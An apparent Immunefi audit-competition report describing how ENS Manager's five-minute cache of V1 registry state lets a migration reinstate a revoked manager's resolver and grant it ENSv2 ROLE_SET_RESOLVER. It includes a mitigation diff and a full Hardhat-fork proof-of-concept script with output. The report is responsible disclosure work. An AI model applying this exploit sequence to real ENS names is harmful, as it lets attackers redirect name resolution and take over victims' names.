# 93133 w a medium stale v1 migration state restores a revoked manager and attacker resolver in ensv2

## #93133 \[W\&A-Medium] Stale V1 migration state restores a revoked manager and attacker resolver in ENSv2

**Submitted on Sep 14th 2026 at 10:48:43 UTC by @Psyone for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93133
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

### Description

## Brief/Intro

ENS Manager caches mutable V1 Registry state for five minutes and builds migration transactions from that cached state. It rechecks the BaseRegistrar NFT owner before migration, but never rechecks the current V1 Registry manager or resolver. If a registrant revokes a malicious manager and replaces that manager's custom resolver after the cache was populated, Manager still migrates the obsolete resolver and grants the revoked manager ENSv2 `ROLE_SET_RESOLVER`. The victim remains displayed as owner, while the attacker regains the ability to redirect the name.

## Vulnerability Details

### Preconditions and actors

* The victim is the BaseRegistrar NFT owner of an unwrapped V1 `.eth` name.
* The attacker was previously the V1 Registry manager and, while authorized, selected a custom resolver they control.
* The victim has since reclaimed the V1 Registry manager position and set a safe resolver. The attacker therefore has no current authority when migration starts.
* Manager fetched the older V1 state before the revocation, and the victim starts migration from the same query cache within five minutes.
* The Manager migration feature flag is enabled for the victim. The route is gated by `POSTHOG_FEATURE_FLAGS.MIGRATION`; the program expressly lists Manager migration impacts as in scope.
* The victim accepts the ordinary Manager migration prompts.

The attacker does not need to compromise the subgraph. The explicit client cache is sufficient to create the stale-state window; indexing delay can only widen it.

### Root cause

`useV1Names` treats the V1 subgraph result as fresh for five minutes:

```ts
resultQueryOptions({
  queryKey: qk('migration', 'v1_names', {
    address: address?.toLowerCase(),
  }),
  queryFn:
    enabled && address ? () => getV1NamesForAddress(address) : skipToken,
  staleTime: 5 * 60 * 1000,
})
```

The response includes the mutable V1 Registry `owner` and `resolver`. For an unwrapped name, `classifyName` copies them into security-sensitive plan fields:

```ts
const v1ResolverAddress = domain.resolver?.address ?? null

const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

A custom resolver selects the `keep-v1` strategy:

```ts
if (v1ResolverAddress && !isKnownPublicResolver(v1ResolverAddress)) {
  return 'keep-v1'
}
```

The gas-estimate query uses `staleTime: 0`, but this only rebuilds the plan from the already supplied `v1Names` objects. It does not refetch the V1 names query.

### The freshness checks cover the wrong ownership plane

For an unwrapped name, `checkOwnership` reads only `BaseRegistrar.ownerOf(labelhash)`:

```ts
{
  address: BASE_REGISTRAR,
  abi: BASE_REGISTRAR_ABI,
  functionName: 'ownerOf' as const,
  args: [BigInt(name.domain.labelhash)] as const,
}
```

That check passes because the victim remains the registration NFT owner. Revoking a V1 Registry manager or changing the V1 Registry resolver does not change the BaseRegistrar owner.

The remaining late checks also do not refresh the vulnerable fields:

* `computeMigrationPreflight` and `buildMigrationPlan` reclassify the same supplied domain objects.
* `prepareExecutionPlan` returns the existing first-attempt plan.
* `assertMigrationApprovalPlanCurrent` compares only missing approval keys.
* `buildNextAtomicBatch` refreshes destination resolver readiness and migration routes, then passes the existing classified objects onward.
* Retry ownership checks again read only BaseRegistrar ownership or NameWrapper balance.

No production migration path reads the current V1 Registry `owner(namehash)` or `resolver(namehash)` immediately before submission.

### Sink 1: the obsolete resolver is installed

For `keep-v1`, `resolverFor` returns the cached custom address:

```ts
case 'keep-v1':
  return (
    isKnownPublicResolver(name.v1ResolverAddress)
      ? defaultResolver
      : (name.v1ResolverAddress ??
        (cannotSetResolverLocked ? zeroAddress : defaultResolver))
  ) as Address
```

`buildAtomicMigrationBatches` places it directly in `MigrationData.resolver`:

```ts
const expectedResolver = resolverFor(classified, defaultResolver, resolver)
const migrationData = createMigrationData({
  label: classified.label,
  owner: wallet,
  subregistry: zeroAddress,
  resolver: expectedResolver,
})
```

The ENSv2 `UnlockedMigrationController` registers the name using the caller-supplied migration resolver. Post-state verification compares the resulting V2 resolver with `expectedResolver`, which came from the stale plan, so verification approves the wrong result.

### Sink 2: the revoked manager gets a new ENSv2 role

When cached `managerAddress` is non-null, the atomic migration appends a role grant:

```ts
if (classified.managerAddress) {
  innerExecutions.push({
    phase: 'manager-role-grant',
    name,
    names: [name],
    call: buildRoleGrantCall(classified),
  })
}
```

The encoded call is:

```ts
args: [resource, ROLE_SET_RESOLVER, name.managerAddress]
```

Because cached `managerAddress` makes restoration appear necessary, the migration flow first asks the victim to approve their HCA as a V2 Registry operator. The V2 authorization path is owner-equivalent as well: `EnhancedAccessControl` inherits `HCAContext`, which resolves a registered HCA caller to its certified owner, and the migrated owner receives `ROLE_SET_RESOLVER_ADMIN`. The HCA's subsequent `grantRoles` therefore executes with the victim owner's V2 authority. The old V1 revocation cannot make this new V2 grant revert because the two permissions live in different authorization systems. Cleanup later removes the HCA operator approval, but does not remove the role already granted to the attacker.

The success verifier explicitly requires the cached address to have `ROLE_SET_RESOLVER`, again turning the stale value into the expected result.

## Impact Details

After an apparently successful migration:

1. The migrated ENSv2 name uses the attacker's obsolete custom resolver rather than the safe resolver currently configured by the victim.
2. The revoked attacker independently receives per-name `ROLE_SET_RESOLVER` and can replace the resolver again at any time until discovered and revoked.
3. The ENS name still belongs to the victim, making the resolver-level takeover less obvious while resolution can point at attacker-controlled addresses.

This directly matches the program's Critical impacts for a migration that assigns resolver control to an attacker and for resolving an ENS name to an attacker-controlled address.

The security boundary is current authority, not historical authority: the victim completed an on-chain revocation and resolver replacement before migration, yet Manager recreates both obsolete privileges from cached external data.

## Mitigation

Read the current V1 Registry owner and resolver for every selected name from the submission chain immediately before the first wallet prompt. Seal those live values into the migration plan. Repeat the check when rebuilding a retry batch, and abort to a new preview if any value differs.

A suitable direction is:

```diff
- const { classified } = classifyNames([...domains], eoa)
+ const liveDomains = await hydrateCurrentV1RegistryState({
+   publicClient,
+   domains,
+ })
+ const { classified } = classifyNames(liveDomains, eoa)

+ for (const name of classified) {
+   const sealed = submittedV1State.get(name.domain.id)
+   if (
+     !sealed ||
+     !isAddressEqual(sealed.manager, name.managerAddress) ||
+     !isAddressEqual(sealed.resolver, name.v1ResolverAddress)
+   ) {
+     throw new MigrationPlanChangedError({
+       message: 'V1 manager or resolver changed; review a new migration preview',
+     })
+   }
+ }
```

The exact manager and resolver addresses being preserved/restored should also be shown in the confirmation UI. The post-state expectations must come from the freshly sealed submission tuple, not from the earlier subgraph response.

## References

* `apps/manager/src/features/migration/hooks/useV1Names.ts:16-23`
* `apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts:62-104`
* `packages/migration/src/service/classifyNames.ts:65-88,137,148-185`
* `packages/migration/src/service/preflightChecks.ts:47-99,191-213`
* `apps/manager/src/features/migration/service/computeMigrationPreflight.ts:199-209`
* `apps/manager/src/features/migration/service/migrationApprovals.ts:116-122,320-350`
* `apps/manager/src/features/migration/service/migrationService.ts:367-390,705-749,886-920,974-1006,1169-1204`
* `apps/manager/src/features/migration/service/encodeMigration.ts:24-50`
* `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:9-25`
* `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:479-491,608-624`
* `apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts:262-275,337-351`
* `apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:81-89`
* `apps/portal/src/lib/roles/permissions.ts:31-34`
* [ENS audit competition scope and known issues](https://immunefi.com/audit-competition/audit-competition-ens/scope/)
* [ENSv2 UnlockedMigrationController source](https://github.com/ensdomains/contracts-v2/blob/main/contracts/src/migration/UnlockedMigrationController.sol)
* [ENSv2 HCA-aware access-control source](https://github.com/ensdomains/contracts-v2/blob/main/contracts/src/access-control/EnhancedAccessControl.sol)
* [ENSv2 registry role documentation](https://github.com/ensdomains/contracts-v2/blob/main/contracts/README.md)
* [ENSv1 BaseRegistrar implementation and reclaim semantics](https://github.com/ensdomains/ens-contracts/blob/staging/contracts/ethregistrar/BaseRegistrarImplementation.sol)

### Proof of Concept

## Proof of Concept

### Reproduction header

```
Repository: immunefi-team/audit-comp-ens
Commit: 1c9b47f18fcddd2e864dfe385c4171061c9811ae
Tool versions: Node.js v22.15.0; pnpm 10.27.0; Hardhat 2.22.17; viem 2.52.2
Install command: pnpm install --frozen-lockfile
Fork command: npx --yes hardhat@2.22.17 --config hardhat.config.cjs node --fork $env:SEPOLIA_RPC_URL --fork-block-number 11682885 --hostname 127.0.0.1 --port 8545
Test command: node poc-stale-v1-migration-fork.mjs
Expected passing/failing assertion: PASS when before migration the revoked attacker has V2 bitmap 0x0 and V1 manager/resolver are the victim and safe resolver, then after the real atomic migration the attacker has ROLE_SET_RESOLVER (0x1000000), the stale resolver is installed, and the attacker's own setResolver transaction succeeds; FAIL if any invariant assertion differs
Fork chain and block: Sepolia (11155111), block 11,682,885, hash 0xcf71c364fff7b9ecf048d58099959b8ce19651fb3bd5184e6aef5991ab9b1075
Environment variables required: SEPOLIA_RPC_URL (read only by the local Hardhat fork; never placed in a transaction)
```

### Numbered reproduction steps

1. Check out the scoped commit and install the locked dependencies with the command above.
2. Save the supplied Hardhat configuration and PoC at the repository root.
3. Export an archival Sepolia endpoint only as `SEPOLIA_RPC_URL`, then start the local fork with the exact pinned command.
4. In a second terminal, run `node poc-stale-v1-migration-fork.mjs`.
5. Confirm the script first reports the victim and safe resolver as current V1 state and attacker V2 bitmap `0x0`.
6. Confirm the real HCA/MigrationHelper transaction succeeds, installs the cached attacker resolver, and gives the revoked manager bitmap `0x1000000`.
7. Confirm the final attacker-originated `setResolver` transaction succeeds and the script prints `REPRODUCED_STALE_V1_MANAGER_ON_PINNED_FORK`.

Two independent public Sepolia RPCs returned the same pinned block hash. All transactions are sent only to local Hardhat chain ID 31337. The PoC checks Hardhat's fork metadata for Sepolia chain ID 11155111, the exact block number and hash, and the runtime bytecode hashes of every deployed contract it exercises.

### Actors, dependencies, and permitted test setup

* **Victim:** the current BaseRegistrar NFT owner, current V1 Registry manager, HCA owner, and signer of the ordinary migration approvals and HCA batch.
* **Revoked manager / attacker:** previously held the V1 manager position and controlled the old resolver, but holds neither V1 authority nor a V2 role when migration begins.
* **External dependencies:** the pinned Sepolia deployments of the legacy ENS Registry, BaseRegistrar, ENSv2 ETHRegistry and ETHRegistrar, HCA factory and implementation, current MigrationHelper, and public resolver. Their bytecode is not mocked or replaced.
* **Test-only setup:** Hardhat account impersonation funds actors and invokes the real BaseRegistrar owner and ETHRegistrar authority solely to seed an otherwise normal V1 registration and corresponding migratable V2 label. It does not edit storage, replace bytecode, grant the attacker a protected role, forge a receipt, or bypass the vulnerable migration path. The victim and attacker transitions are performed through the deployed contracts' public functions.
* **No public side effects:** the RPC URL is an environment variable used only to read the pinned fork. No transaction is signed for or broadcast to Sepolia.

The violated invariant is: **revoked V1 manager and resolver state must not be recreated during V2 migration**. The PoC first creates and snapshots the old authorized state, revokes it through real V1 calls, proves the current safe state and zero attacker V2 roles, executes the exact MigrationHelper-plus-`grantRoles` HCA sequence, and finally proves the recreated role is effective by having the attacker call the real V2 `setResolver`.

### Hardhat configuration

Save as `hardhat.config.cjs`:

```js
module.exports = {
  solidity: '0.8.25',
  networks: {
    hardhat: {
      hardfork: 'cancun',
    },
  },
}
```

### Run

In PowerShell terminal 1:

```powershell
pnpm install --frozen-lockfile
$env:HARDHAT_EXPERIMENTAL_ALLOW_NON_LOCAL_INSTALLATION = 'true'
npx --yes hardhat@2.22.17 --config hardhat.config.cjs node --fork $env:SEPOLIA_RPC_URL --fork-block-number 11682885 --hostname 127.0.0.1 --port 8545
```

In terminal 2, save the following as `poc-stale-v1-migration-fork.mjs` at the repository root, then run `node poc-stale-v1-migration-fork.mjs`:

```js
#!/usr/bin/env node

import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { pathToFileURL } from 'node:url'
import { execFileSync } from 'node:child_process'

const ROOT = process.cwd()
const viemUrl = pathToFileURL(
  path.join(
    ROOT,
    'node_modules/.pnpm/viem@2.52.2_typescript@6.0.3_zod@4.1.13/node_modules/viem/_esm/index.js',
  ),
).href
const {
  encodeFunctionData,
  decodeFunctionResult,
  keccak256,
  toBytes,
  namehash,
  parseAbi,
} = await import(viemUrl)

const RPC_URL = process.env.POC_RPC_URL ?? 'http://127.0.0.1:8545'
const REVISION = '1c9b47f18fcddd2e864dfe385c4171061c9811ae'
const BASE_BLOCK = '0xb24445'
const BASE_BLOCK_HASH =
  '0xcf71c364fff7b9ecf048d58099959b8ce19651fb3bd5184e6aef5991ab9b1075'

const ZERO = '0x0000000000000000000000000000000000000000'
const VICTIM = '0x1111111111111111111111111111111111111111'
const ATTACKER = '0x2222222222222222222222222222222222222222'
const STALE_ATTACKER_RESOLVER = ATTACKER
const CURRENT_SAFE_RESOLVER = '0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5'

const LEGACY_REGISTRY = '0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e'
const BASE_REGISTRAR = '0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85'
const BASE_REGISTRAR_OWNER = '0x4ad56feb5Fc7B8298db06E88fd5CBc41D64602Fa'
const ETH_REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const ETH_REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const HCA_FACTORY = '0x900FF7cF617Ef9D802178B4ef480491e3A782672'
const HCA_IMPLEMENTATION = '0xAA761541620fC1a42bb701a26a9f107A9DF1E904'
const MIGRATION_HELPER = '0xddC597d937618849348E18Db5D631Ce747bCDeEF'
const EXPECTED_CODE_HASHES = new Map([
  [LEGACY_REGISTRY, '0x8ea75f170914f04bc7c03e47eac3d7f5763f40fd5337cad69011bc7245fcf4a0'],
  [BASE_REGISTRAR, '0xd7d99a683d1a24fb7af58dc110335c71e09931208bff8b4e00d7787749d030ed'],
  [ETH_REGISTRY, '0x99a6ba74173ac220fd9d7a2000a8142cf52d98c7a17ac6abc6d74fa17d8f086c'],
  [ETH_REGISTRAR, '0x7ac653f817e6bef6543d25ce97235b232430b1771ab5bcb27b936798fe38af1f'],
  [HCA_FACTORY, '0x1a50c57edb1e9677f27c7329f022ec6f338def7d3742768d7997ce6fc41831d7'],
  [HCA_IMPLEMENTATION, '0x348dc95a362bf23633f8142e54e92dea48091d108d24c323bea50794c89351fd'],
  [MIGRATION_HELPER, '0x0b8acb00c2912a8b43085e0f55f9459b956cb51be1a16a5ff7ef0346dbd18143'],
  [CURRENT_SAFE_RESOLVER, '0xdef30ec9847597b3e47d2a2e6bc2921d3f92f710ce75c139c03102cc133e71a1'],
])

const LABEL = 'mgr01-guideline-poc'
const TOKEN_ID = BigInt(keccak256(toBytes(LABEL)))
const NODE = namehash(`${LABEL}.eth`)
const CANONICAL_ID = TOKEN_ID ^ (TOKEN_ID & 0xffffffffn)
const ROLE_SET_RESOLVER = 1n << 24n
const ONE_YEAR = 365n * 24n * 60n * 60n

const registrarAbi = parseAbi([
  'function addController(address controller)',
  'function controllers(address controller) view returns (bool)',
  'function register(uint256 id,address owner,uint256 duration) returns (uint256)',
  'function reclaim(uint256 id,address owner)',
  'function ownerOf(uint256 id) view returns (address)',
  'function setApprovalForAll(address operator,bool approved)',
])
const legacyRegistryAbi = parseAbi([
  'function owner(bytes32 node) view returns (address)',
  'function resolver(bytes32 node) view returns (address)',
  'function setOwner(bytes32 node,address owner)',
  'function setResolver(bytes32 node,address resolver)',
])
const ethRegistryAbi = parseAbi([
  'function register(string label,address owner,address registry,address resolver,uint256 roleBitmap,uint64 expiry) returns (uint256)',
  'function getStatus(uint256 anyId) view returns (uint8)',
  'function getResolver(string label) view returns (address)',
  'function roles(uint256 anyId,address account) view returns (uint256)',
  'function grantRoles(uint256 anyId,uint256 roleBitmap,address account) returns (bool)',
  'function setApprovalForAll(address operator,bool approved)',
  'function setResolver(uint256 anyId,address resolver)',
])
const hcaFactoryAbi = parseAbi([
  'function deploy(address owner,address hcaImplementation,uint256 userSalt) returns (address hca)',
  'function authorizedOwnerOf(address hca) view returns (address)',
])
const hcaAbi = parseAbi([
  'function owner() view returns (address)',
  'function executeByOwner((address target,uint256 value,bytes callData)[] executions) payable',
])
const migrationHelperAbi = parseAbi([
  'function migrate((string label,address owner,address subregistry,address resolver)[] unwrapped,(string label,address owner,address subregistry,address resolver)[][] unlockedGroups,(string label,address owner,address subregistry,address resolver)[][] lockedGroups,(bytes parentName,(string label,address owner,address subregistry,address resolver)[][] groups)[] lockedChildrenGroups)',
])

async function rpc(method, params, allowError = false) {
  const response = await fetch(RPC_URL, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
  })
  const body = await response.json()
  if (body.error && !allowError) {
    throw new Error(`${method}: ${JSON.stringify(body.error)}`)
  }
  return body.error ? { error: body.error } : { result: body.result }
}

async function call(address, abi, functionName, args = []) {
  const data = encodeFunctionData({ abi, functionName, args })
  const { result } = await rpc('eth_call', [{ to: address, data }, 'latest'])
  return decodeFunctionResult({ abi, functionName, data: result })
}

async function send(from, to, abi, functionName, args = []) {
  await rpc('hardhat_impersonateAccount', [from])
  await rpc('hardhat_setBalance', [from, '0x3635c9adc5dea00000'])
  const data = encodeFunctionData({ abi, functionName, args })
  try {
    const { result: hash } = await rpc('eth_sendTransaction', [
      { from, to, data, value: '0x0', gas: '0x1c9c380' },
    ])
    const { result: receipt } = await rpc('eth_getTransactionReceipt', [hash])
    assert(receipt, `missing receipt ${hash}`)
    assert.equal(receipt.status, '0x1', `${functionName} reverted in ${hash}`)
    return { hash, receipt, data }
  } finally {
    await rpc('hardhat_stopImpersonatingAccount', [from])
  }
}

function assertManagerSourceFlow() {
  assert.equal(
    execFileSync('git', ['rev-parse', 'HEAD'], { encoding: 'utf8' }).trim(),
    REVISION,
  )
  const query = fs.readFileSync(
    'apps/manager/src/features/migration/hooks/useV1Names.ts',
    'utf8',
  )
  const classify = fs.readFileSync(
    'packages/migration/src/service/classifyNames.ts',
    'utf8',
  )
  const batch = fs.readFileSync(
    'apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts',
    'utf8',
  )
  assert.match(query, /staleTime: 5 \* 60 \* 1000/)
  assert.match(classify, /const registryOwnerAddress = toAddress\(domain\.owner\.id\)/)
  assert.match(classify, /const v1ResolverAddress = domain\.resolver\?\.address \?\? null/)
  assert.match(batch, /account: classified\.managerAddress/)
  assert.match(batch, /resolver: expectedResolver/)
}

async function main() {
  assertManagerSourceFlow()
  const { result: chainId } = await rpc('eth_chainId', [])
  assert.equal(chainId, '0x7a69', 'transactions must stay on local Hardhat chain 31337')
  const { result: metadata } = await rpc('hardhat_metadata', [])
  assert.equal(metadata.forkedNetwork?.chainId, 11155111)
  assert.equal(metadata.forkedNetwork?.forkBlockNumber, Number(BigInt(BASE_BLOCK)))
  assert.equal(metadata.forkedNetwork?.forkBlockHash, BASE_BLOCK_HASH)
  const { result: block } = await rpc('eth_getBlockByNumber', [BASE_BLOCK, false])
  assert.equal(block.hash, BASE_BLOCK_HASH)
  for (const [address, expectedHash] of EXPECTED_CODE_HASHES) {
    const { result: code } = await rpc('eth_getCode', [address, BASE_BLOCK])
    assert.equal(keccak256(code), expectedHash, `unexpected runtime at ${address}`)
  }

  // Create a normal unwrapped V1 registration using the real deployed registrar.
  if (!(await call(BASE_REGISTRAR, registrarAbi, 'controllers', [VICTIM]))) {
    await send(
      BASE_REGISTRAR_OWNER,
      BASE_REGISTRAR,
      registrarAbi,
      'addController',
      [VICTIM],
    )
  }
  await send(VICTIM, BASE_REGISTRAR, registrarAbi, 'register', [
    TOKEN_ID,
    VICTIM,
    ONE_YEAR,
  ])
  assert.equal(
    (await call(BASE_REGISTRAR, registrarAbi, 'ownerOf', [TOKEN_ID])).toLowerCase(),
    VICTIM.toLowerCase(),
  )

  // Reach the stale snapshot honestly, then revoke it on-chain.
  await send(VICTIM, LEGACY_REGISTRY, legacyRegistryAbi, 'setResolver', [
    NODE,
    STALE_ATTACKER_RESOLVER,
  ])
  await send(VICTIM, LEGACY_REGISTRY, legacyRegistryAbi, 'setOwner', [
    NODE,
    ATTACKER,
  ])
  const cachedManager = await call(LEGACY_REGISTRY, legacyRegistryAbi, 'owner', [NODE])
  const cachedResolver = await call(
    LEGACY_REGISTRY,
    legacyRegistryAbi,
    'resolver',
    [NODE],
  )
  assert.equal(cachedManager.toLowerCase(), ATTACKER.toLowerCase())
  assert.equal(cachedResolver.toLowerCase(), STALE_ATTACKER_RESOLVER.toLowerCase())

  await send(VICTIM, BASE_REGISTRAR, registrarAbi, 'reclaim', [TOKEN_ID, VICTIM])
  await send(VICTIM, LEGACY_REGISTRY, legacyRegistryAbi, 'setResolver', [
    NODE,
    CURRENT_SAFE_RESOLVER,
  ])
  assert.equal(
    (await call(LEGACY_REGISTRY, legacyRegistryAbi, 'owner', [NODE])).toLowerCase(),
    VICTIM.toLowerCase(),
  )
  assert.equal(
    (await call(LEGACY_REGISTRY, legacyRegistryAbi, 'resolver', [NODE])).toLowerCase(),
    CURRENT_SAFE_RESOLVER.toLowerCase(),
  )

  // Reserve the real V2 label through the configured ETHRegistrar authority.
  const { result: latest } = await rpc('eth_getBlockByNumber', ['latest', false])
  const expiry = BigInt(latest.timestamp) + ONE_YEAR
  assert.equal(await call(ETH_REGISTRY, ethRegistryAbi, 'getStatus', [TOKEN_ID]), 0)
  await send(ETH_REGISTRAR, ETH_REGISTRY, ethRegistryAbi, 'register', [
    LABEL,
    ZERO,
    ZERO,
    CURRENT_SAFE_RESOLVER,
    0n,
    expiry,
  ])
  assert.equal(await call(ETH_REGISTRY, ethRegistryAbi, 'getStatus', [TOKEN_ID]), 1)

  // Deploy the configured Standalone HCA and verify its certified owner.
  const deployData = encodeFunctionData({
    abi: hcaFactoryAbi,
    functionName: 'deploy',
    args: [VICTIM, HCA_IMPLEMENTATION, 0n],
  })
  const { result: simulatedDeploy } = await rpc('eth_call', [
    { from: VICTIM, to: HCA_FACTORY, data: deployData },
    'latest',
  ])
  const HCA = decodeFunctionResult({
    abi: hcaFactoryAbi,
    functionName: 'deploy',
    data: simulatedDeploy,
  })
  await send(VICTIM, HCA_FACTORY, hcaFactoryAbi, 'deploy', [
    VICTIM,
    HCA_IMPLEMENTATION,
    0n,
  ])
  assert.equal((await call(HCA, hcaAbi, 'owner')).toLowerCase(), VICTIM.toLowerCase())
  assert.equal(
    (
      await call(HCA_FACTORY, hcaFactoryAbi, 'authorizedOwnerOf', [HCA])
    ).toLowerCase(),
    VICTIM.toLowerCase(),
  )

  // This is the normal Manager preflight approval used when manager roles must
  // be restored by the HCA after MigrationHelper creates the V2 name.
  await send(VICTIM, ETH_REGISTRY, ethRegistryAbi, 'setApprovalForAll', [
    HCA,
    true,
  ])

  await send(VICTIM, BASE_REGISTRAR, registrarAbi, 'setApprovalForAll', [
    MIGRATION_HELPER,
    true,
  ])

  const migrationData = {
    label: LABEL,
    owner: VICTIM,
    subregistry: ZERO,
    resolver: cachedResolver,
  }
  const migrateData = encodeFunctionData({
    abi: migrationHelperAbi,
    functionName: 'migrate',
    args: [[migrationData], [], [], []],
  })
  const grantData = encodeFunctionData({
    abi: ethRegistryAbi,
    functionName: 'grantRoles',
    args: [CANONICAL_ID, ROLE_SET_RESOLVER, cachedManager],
  })
  const outer = await send(VICTIM, HCA, hcaAbi, 'executeByOwner', [
    [
      { target: MIGRATION_HELPER, value: 0n, callData: migrateData },
      { target: ETH_REGISTRY, value: 0n, callData: grantData },
    ],
  ])

  const v2Resolver = await call(ETH_REGISTRY, ethRegistryAbi, 'getResolver', [LABEL])
  const attackerRoles = await call(ETH_REGISTRY, ethRegistryAbi, 'roles', [
    CANONICAL_ID,
    ATTACKER,
  ])
  assert.equal(v2Resolver.toLowerCase(), STALE_ATTACKER_RESOLVER.toLowerCase())
  assert.equal(BigInt(attackerRoles) & ROLE_SET_RESOLVER, ROLE_SET_RESOLVER)

  // Prove the restored attacker role is effective on the real V2 registry.
  const attackerChange = await send(
    ATTACKER,
    ETH_REGISTRY,
    ethRegistryAbi,
    'setResolver',
    [CANONICAL_ID, ATTACKER],
  )
  assert.equal(
    (await call(ETH_REGISTRY, ethRegistryAbi, 'getResolver', [LABEL])).toLowerCase(),
    ATTACKER.toLowerCase(),
  )

  console.log(
    JSON.stringify(
      {
        result: 'REPRODUCED_STALE_V1_MANAGER_ON_PINNED_FORK',
        violatedInvariant:
          'Revoked V1 manager and resolver state must not be recreated during V2 migration',
        actors: { victim: VICTIM, revokedManager: ATTACKER, hca: HCA },
        beforeMigration: {
          currentV1Manager: VICTIM,
          currentV1Resolver: CURRENT_SAFE_RESOLVER,
          attackerV2Roles: '0x0',
        },
        cachedSnapshot: { cachedManager, cachedResolver },
        migration: {
          outerTransactionHash: outer.hash,
          staleResolverInstalled: v2Resolver,
          attackerRoleBitmap: `0x${BigInt(attackerRoles).toString(16)}`,
        },
        attackerExercise: {
          transactionHash: attackerChange.hash,
          resolverAfter: ATTACKER,
        },
      },
      null,
      2,
    ),
  )
}

main().catch((error) => {
  console.error(error)
  process.exitCode = 1
})
```

Observed output:

```json
{
  "result": "REPRODUCED_STALE_V1_MANAGER_ON_PINNED_FORK",
  "violatedInvariant": "Revoked V1 manager and resolver state must not be recreated during V2 migration",
  "actors": {
    "victim": "0x1111111111111111111111111111111111111111",
    "revokedManager": "0x2222222222222222222222222222222222222222",
    "hca": "0x4F42A984116Fd03ccc97827C224edF909D7A48B3"
  },
  "beforeMigration": {
    "currentV1Manager": "0x1111111111111111111111111111111111111111",
    "currentV1Resolver": "0xE99638b40E4Fff0129D56f03b55b6bbC4BBE49b5",
    "attackerV2Roles": "0x0"
  },
  "cachedSnapshot": {
    "cachedManager": "0x2222222222222222222222222222222222222222",
    "cachedResolver": "0x2222222222222222222222222222222222222222"
  },
  "migration": {
    "outerTransactionHash": "0x2359db9dd8094da0e215121aa7db67b2b848dc4363a5c86e2ca03e25112e389e",
    "staleResolverInstalled": "0x2222222222222222222222222222222222222222",
    "attackerRoleBitmap": "0x1000000"
  },
  "attackerExercise": {
    "transactionHash": "0xe92aa6bcfe2fab22a3a12f138898d66b0eb7097f9a4f564b004de806dfc60595",
    "resolverAfter": "0x2222222222222222222222222222222222222222"
  }
}
```

The output demonstrates both exploit effects against deployed bytecode: the obsolete resolver is installed during migration, and the revoked manager receives an independently usable ENSv2 resolver-control role.
